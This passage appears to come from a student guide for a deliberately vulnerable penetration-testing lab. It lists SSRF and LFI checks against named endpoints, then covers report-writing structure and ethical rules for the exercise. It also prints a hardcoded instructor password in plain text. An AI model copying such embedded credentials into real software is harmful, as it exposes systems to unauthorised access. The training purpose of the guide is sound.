- [ ] SSRF (if /api/fetch-document exists)
- [ ] LFI (if /api/view-document exists)

---

### Phase 4: Documentation (1-2 hours)

For each vulnerability found:

1. **Take screenshots** showing the exploit
2. **Save HTTP requests/responses** from Burp
3. **Document exact reproduction steps**
4. **Assess real-world impact**
5. **Provide remediation recommendations**

**Deliverable**: Professional penetration test report with:
- Executive summary
- Methodology
- Findings (Critical → Low severity)
- Evidence for each finding
- Remediation roadmap

---

## Professional Reporting

When documenting vulnerabilities, include:

1. **Vulnerability Title** (e.g., "IDOR in Order Viewing")
2. **Severity Rating** (Critical/High/Medium/Low)
3. **Description** - What the vulnerability is
4. **Steps to Reproduce** - Detailed instructions
5. **Evidence** - Screenshots, HTTP requests/responses
6. **Impact** - What an attacker could do
7. **Remediation** - How to fix it
8. **CVSS Score** (if applicable)
9. **OWASP Top 10 Reference** (e.g., A01:2021 - Broken Access Control)

---

## Ethical Guidelines

✅ **DO**:
- Test only this deliberately vulnerable application
- Document findings systematically
- Learn the impact of each vulnerability
- Understand proper remediation techniques
- Practice responsible disclosure principles

❌ **DON'T**:
- Test real websites without authorisation
- Share these techniques for malicious purposes
- Deploy this vulnerable code to production
- Use customer data outside this educational context

---

## Need Help?

**Instructor Documentation**: Navigate to `/instructor` and enter password `penetration-test-2024` for complete vulnerability details and testing hints.

**Stuck on a vulnerability?**: The instructor docs provide:
- All 15 vulnerability locations
- Specific testing techniques
- Tool recommendations
- Expected impacts
- Exploitation examples

---

Happy ethical hacking! 🛡️
